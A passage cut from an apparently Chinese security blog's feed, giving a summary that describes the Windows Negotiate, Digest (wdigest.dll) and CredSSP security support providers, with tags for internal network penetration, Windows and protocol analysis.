&lt;li&gt;Negotiate（Windows 2000中引入）(secur32.dll) - Negotiate安全包在Kerberos和NTLM之间进行选择协商选择。Negotiate默认使用Kerberos，当Kerberos不能被身份验证中涉及的某个系统使用时，将使用NTLM。&lt;/li&gt;
&lt;li&gt;摘要SSP（Windows XP中引入）(wdigest.dll) - 在Windows与Kerberos不可用的非Windows系统间提供基于HTTP和SASL身份验证的质询/响应。&lt;/li&gt;
&lt;li&gt;凭据 (CredSSP)（Windows Vista中引入，Windows XP SP3上也可用）(credssp.dll) - 为远程桌面连接提供单点登录（SSO）和网络级身份验证。</summary>
    
    
    
    <category term="内网渗透" scheme="http://lahonja.me/categories/内网渗透/"/>
    
    
    <category term="Windows" scheme="http://lahonja.me/tags/Windows/"/>
    
    <category term="漏洞分析" scheme="http://lahonja.me/tags/漏洞分析/"/>
    
    <category term="协议分析" scheme="http://lahonja.me/tags/协议分析/"/>
    
  </entry>
  
</feed>
